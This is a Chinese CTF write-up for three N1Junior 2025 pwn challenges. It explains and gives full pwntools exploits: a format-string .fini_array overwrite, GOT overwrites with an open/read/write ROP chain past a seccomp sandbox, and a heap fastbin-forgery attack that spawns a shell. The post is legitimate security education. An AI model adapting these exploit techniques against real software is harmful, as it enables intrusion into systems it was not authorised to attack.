+++
date = '2025-03-12T00:04:26+08:00'
draft = false
title = 'N1Junior_2025 Pwn'
categories = ["WP"]

+++



N1Junior_2025 Pwn复现

<!--more-->

## Remake

涉及知识点：.fini_array

```c
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
```

```c
 __int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  sub_11A9();
  read(0, format, 0x10u);
  printf(format);
  if ( dword_4060 ) //刚开始 dword_4060 = 0
    sub_120E();
  else
    dword_4060 = 1;
  return 0;
}
```

```c
unsigned __int64 sub_120E()
{
  char buf[16]; // [rsp+0h] [rbp-1010h] BYREF
  unsigned __int64 v2; // [rsp+1008h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  read(0, buf, 0x300u);
  printf(buf);
  return v2 - __readfsqword(0x28u);
}
```

看到程序，很容易联想到修改.fini_array来重新执行main函数（这样`dword_4060`就会等于1，进入`sub_120E`函数）

接下来就是利用格式化字符串漏洞`printf(format);`，来修改.fini_array

![](/img/N1Junior/35e9c766a071faef5ad326467e4eae4.png)

.fini_array下面就是main函数的地址(出题人的gift)

![](/img/N1Junior/040ae9b77cf26c180e46af195f8095d.png)

程序开了PIE，`程序基地址+0x3da0`为.fini_array地址，我们可以通过`程序基地址+8+0x3da0`这样就能修改程序返回地址为main函数地址

> printf是栈中指向程序基地址的地址位于动态连接器，可能为struct link_map中的l_addr(程序基地址)
>
> 因为`.fini_array 的实际地址 = l_addr + .fini_array 的偏移地址`
>
> 所以这里我们让l_addr+8

同时，通过栈中`main`函数的地址减去偏移，就能得到PIE基地址

这时exp:

```python
from pwn import *
context(os='linux',arch='amd64',log_level='debug')
def dbg():
    gdb.attach(p)
    pause()

address = './remake'
p = process(address)

# elf = ELF(address)
# libc = ELF.libc

# ip = ""
# port = 
#p = remote(ip,port)

#-----------------------------------------------------------------
s       = lambda data               :p.send(data)
ss      = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(data)
sls     = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num                :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
l64     = lambda      :u64(p.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda      :u32(p.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))
#-----------------------------------------------------------------

pl = b'%8c%30$hhn%9$p'
# dbg()
sl(pl)
ru(b"0x")
pie = int(r(16),16) - 0x1279
success("pie = 0x%x",pie)
```

发送payload之后，再dbg，在重新执行时，查看printf时的栈情况

再在栈中寻找stack地址和libc地址，再通过覆盖返回地址为one_gadget，实现getshell

最终exp:

```python
from pwn import *
context(os='linux',arch='amd64',log_level='debug')
def dbg():
    gdb.attach(p)
    pause()

address = './remake'
p = process(address)

elf = ELF(address)
libc = ELF("./libc.so.6")

# ip = ""
# port = 
#p = remote(ip,port)

#-----------------------------------------------------------------
s       = lambda data               :p.send(data)
ss      = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(data)
sls     = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num                :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
l64     = lambda      :u64(p.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda      :u32(p.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))
#-----------------------------------------------------------------

pl = b'%8c%30$hhn%9$p'
# dbg()
sl(pl)
ru(b"0x")
pie = int(r(16),16) - 0x1279
success("pie = 0x%x",pie)


pl = b"%12$p%26$p" #stack libc
# dbg()
sl(pl)

# ru(b"0x")
ru(b"0x")
stack = int(r(12),16) - 0x40
ru(b"0x")
libc_addr = int(r(12),16) - 0x216600

success("stack=0x%x",stack)
success("libc_base=0x%x",libc_addr)

stack_ret_addr = stack + 8
pop_rdi_ret = libc_addr + 0x2a3e5
binsh_addr = libc_addr + next(libc.search(b"/bin/sh"))
system_addr = libc_addr + libc.sym["system"]

one = [0xebc81,0xebc85,0xebc88,0xebce2,0xebd38,0xebd3f,0xebd43]
one_addr = libc_addr + one[4]

payload2 = fmtstr_payload(6,{stack_ret_addr:one_addr})
# dbg()
s(payload2)


itr()
```

## write_at_will

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

### 逆向分析

程序开了沙箱

```sh
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0006
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0006: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x15 0x00 0x01 0x00000101  if (A != openat) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x15 0x00 0x01 0x00000003  if (A != close) goto 0014
 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0014: 0x06 0x00 0x00 0x00000000  return KILL
```

只允许了exit、read、write、openat、close

要通过 openat、read、write读出flag，这里注意要在当前目录下创建一个flag

### 思路

- 程序中没留后门函数，需要libc，先泄露libc
- 改printf_got为gets，改exit_got为0x40165a，改__stack_chk_fail为ret。这样相当于做ROP
- 写openat+read+write的ROP链

> 在call  __stack_chk_fail的时候会push下一条指令的地址



```python
from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
context(os='linux',arch='amd64',log_level='debug')
def dbg():
    gdb.attach(p)
    # pause()

address = './pwn'
p = process(address)

elf = ELF(address)
libc = elf.libc

# ip = ""
# port = 
#p = remote(ip,port)

exit_got = elf.got['exit']

def arb_write(address,content):
    p.sendlineafter(b'. Exit\n',b'1')
    p.sendafter(b'get?',str(address).encode())
    p.send(p32(content))

#泄露libc
p.sendlineafter(b'3. Exit\n',b'2')
p.sendafter(b'get?',str(0x404038).encode())
p.recvuntil(b'\x0a')
libc_base = u64(p.recv(6)[-7:].ljust(8,b'\x00')) - 0x7330237b97d0 + 0x7330236a5000
success("libc ---> 0x%x",libc)

gets_addr = libc_base + libc.symbols['gets']
#改printf为gets
arb_write(0x404030,gets_addr&0xffffffff)

#改exit_got
arb_write(exit_got,0x40165a)

#改stack chk fail 为 ret指令
arb_write(0x404028,0x40101a)

openat = libc_base + libc.symbols['openat']
read = libc_base + libc.symbols['read']
write = libc_base + libc.symbols['write']
exit_addr = libc_base + libc.symbols['exit']
pop_rdi_ret = libc_base + 0x000000000002a3e5
pop_rsi_ret = libc_base + 0x000000000002be51
pop_rdx_rcx_rbx_ret = libc_base + 0x0000000000108b03

ret = 0x40101a
pl = b'a'*0xa + p64(ret)*8
pl += p64(pop_rdi_ret) + p64(0x404200) + p64(gets_addr)
pl += p64(pop_rdi_ret) + p64(0xffffff9c) + p64(pop_rsi_ret) + p64(0x404200) +p64(pop_rdx_rcx_rbx_ret) + p64(0)*3 + p64(openat)
pl += p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(0x404300) + p64(pop_rdx_rcx_rbx_ret) + p64(0x100)*3 + p64(read)
pl += p64(pop_rdi_ret) + p64(1) + p64(write)
# dbg()
p.sendline(pl)

p.sendline(b'/flag\x00')

p.interactive()
```



## oldwine

### 逆向分析

菜单题

- add：
	- 根据读入的data_size申请堆块，chunk限制小于等于0x60
	- 并把读入的account、password、堆块地址八字节一写，写0x18一组进0x602040
	- 最后把password根据password的第一个字节对其进行异或加密，还把存储的堆地址的最后一个字节给加密了
- delete：
	- free掉堆块，把account、password、堆块地址置0
- show：
	- 输入idx，验证password，通过就打印account和data
	- data这里用的是%s，没有\x00就会一直输出



需要知道的几个点：

- 把密码的最后一个字节设置成\x00，就能绕过加密
- **我们free掉的是加密后的堆地址，可以通过控制加密后的地址，实现邻近地址的任意free（这也是这道题的核心利用点）**



我的思路：

- 泄露libc：
- 通过libc中的__environ泄露栈地址：
- 到栈上做ROP：



首先这么构造堆块

```python
data = p64(0)+p64(0x91)
add(p64(0x123),p8(0x50),0x10,data) #0

data = p64(0) + p64(0xa1)
add(p64(0x123),p64(0),0x50,data) #1

data = b'aaaa'
add(p64(0x123),p64(0),0x40,data) #2
add(p64(0x123),p64(0),0x10,data) #3
```



{{< image src="/img/N1Junior/oldwine1.png" width="900px">}}



可以看到经过异或加密，delete(0)的时候，实际上是去delete那个伪造的unsorted bin

接下来，再去把哪个Unsorted bin中的堆块申请出来的时候，其中的libc地址还在那里，泄露出来就行

```python
delete(0,p8(0x50)) #0被free

data = b'p'*8
add(p64(0x123),p64(0),0x20,data) #0
show(0,p64(0))
p.recvuntil(b'p'*8)
libc_base = u64(p.recv(6).ljust(8,b'\x00')) - 0x3c4c08
success("libc_base -> 0x%x",libc_base)
environ = libc_base + libc.symbols['__environ']
environ_lastbyte = environ & 0xff
success("environ -> 0x%x",environ)
```



接下来，通过伪造fastbin的fd，把堆块申请到bss上

```python
delete(2,p64(0)) #进入fastbin #2被free
#覆盖fastbin中堆块的fd
pl = p64(0)*3 + p64(0x51) + p64(0x602098) #绕过对fastbin的size的检查
add(p64(0x123),p64(0),0x50,pl) #2
```

这部分delete(2)之后的堆结构：



{{< image src="/img/N1Junior/oldwine2.png" width="900px">}}



然后申请的是0x60的chunk，fastbin没有满足的，unsortedbin中有一个满足，又因为0x70-0x60 < 0x20，如果切割剩下的堆块小于0x20，所以整个都给分配出来，再往fastbin的fd写入bss地址

接着往bss上写入environ去泄露栈地址：

```
add(p64(0x50),p64(0),0x40,data) #4
#泄露栈地址
data = p64(0) + p64(environ)
add(p64(0x123),p64(0),0x40,data) #5，0x6020a8
show(4,p64(0))
p.recvuntil(b'[data]: ')
stack_addr = u64(p.recv(6).ljust(8,b'\x00'))
success("stack_addr -> 0x%x",stack_addr)
```



做ROP的环节还是覆盖fastbin的fd，讲一下比较关键的部分：



{{< image src="/img/N1Junior/oldwine3.png" width="900px">}}



我们可以执行下面的命令来看看申请fastbin到哪里，怎么申请：

{{< image src="/img/N1Junior/oldwine4.png" width="900px">}}



有两个地址可以供我们使用，但是有一个是需要0x70的fastbin，我们最大只能申请0x60的chunk，所以用第二个。把堆申请到这里，再去system("/bin/sh")就可以了



### exp

> 其实感觉还有更简单的方法

```python
from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
context(os='linux',arch='amd64',log_level='debug')
def dbg():
    gdb.attach(p)
    # pause()

address = './pwn'
p = process(address)

elf = ELF(address)
libc = elf.libc

ip = "host.docker.internal"
port = 5555
# p = remote(ip,port)

def cmd(idx):
    p.recvuntil(b'>> ')
    p.sendline(str(idx).encode())

def add(account,password,size,data):
    cmd(1)
    p.sendafter(b'[account]: ',account)
    p.sendafter(b'[password]: ',password)
    p.sendafter(b'[data size]: ',str(size))
    p.sendafter(b'[data]: ',data)

def delete(idx,password):
    cmd(2)
    p.sendafter(b'[idx]: ',str(idx).encode())
    p.sendafter(b'[verify]: ',password)

def show(idx,password):
    cmd(3)
    p.sendafter(b'[idx]: ',str(idx).encode())
    p.sendafter(b'[verify]: ',password)

#泄露libc
data = p64(0)+p64(0x91)
add(p64(0x123),p8(0x50),0x10,data) #0

data = p64(0) + p64(0xa1)
add(p64(0x123),p64(0),0x50,data) #1

data = b'aaaa'
add(p64(0x123),p64(0),0x40,data) #2
add(p64(0x123),p64(0),0x10,data) #3
delete(0,p8(0x50)) #0被free

data = b'p'*8
add(p64(0x123),p64(0),0x20,data) #0
show(0,p64(0))
p.recvuntil(b'p'*8)
libc_base = u64(p.recv(6).ljust(8,b'\x00')) - 0x3c4c08
success("libc_base -> 0x%x",libc_base)

environ = libc_base + libc.symbols['__environ']
environ_lastbyte = environ & 0xff
success("environ -> 0x%x",environ)

delete(2,p64(0)) #进入fastbin #2被free
#覆盖fastbin中堆块的fd
pl = p64(0)*3 + p64(0x51) + p64(0x602098) #绕过对fastbin的size的检查
add(p64(0x123),p64(0),0x50,pl) #2

add(p64(0x50),p64(0),0x40,data) #4
#泄露栈地址
data = p64(0) + p64(environ)
add(p64(0x123),p64(0),0x40,data) #5，0x6020a8
show(4,p64(0))
p.recvuntil(b'[data]: ')
stack_addr = u64(p.recv(6).ljust(8,b'\x00'))
success("stack_addr -> 0x%x",stack_addr)


#ROP
data = b'aaaa'
add(p64(0x123),p64(0x30),0x10,data) #6
pl = p64(0) +  p64(0x61) + p64(0) + p64(0x61)
add(p64(0x123),p64(0),0x50,pl)#7
#下面这两个堆块用于防止consolidate和对invalid next size (fast)的检测
data = p64(0) + p64(0x51)
add(p64(0x123),p64(0),0x10,data)#8 
data = p64(0)*2 + p64(0) + p64(0x31)
add(p64(0x123),p64(0xe0),0x20,data)#9
delete(9,p64(0xe0)) #可以控制堆块
delete(6,p64(0x30))
#改堆块8的size为0x41,做ROP
pl = p64(0) + p64(0x61) + p64(0)*7 + p64(0x41)
add(p64(0x123),p64(0),0x50,pl)  #6
#接下来free掉堆块8,其size为0x41,进入fast bin
add(p64(0x123),p64(0),0x10,data) #9 
add(p64(0x123),p64(0),0x10,data) #10
delete(8,p64(0))

#改堆块8的fd为栈地址,让其size为0x40
fake_fast_addr = stack_addr - 0x136
rbp = stack_addr + 0xf8
pl = p64(0)*7 + p64(0x41) + p64(fake_fast_addr)
success("fake_fast_addr -> 0x%x",fake_fast_addr)
add(p64(0x123),p64(0),0x50,pl)#8
add(p64(0x123),p64(0),0x30,data) #11
system_addr = libc_base + libc.sym['system']
binsh_addr = libc_base + next(libc.search("/bin/sh"))
pop_rdi_ret = 0x0000000000400df3
pl = b'\x00'*6 + p64(0) + p64(rbp)
pl+=p64(pop_rdi_ret) + p64(binsh_addr) +  p64(system_addr)
add(p64(0x123),p64(0),0x30,pl)


# dbg()
p.interactive()
```



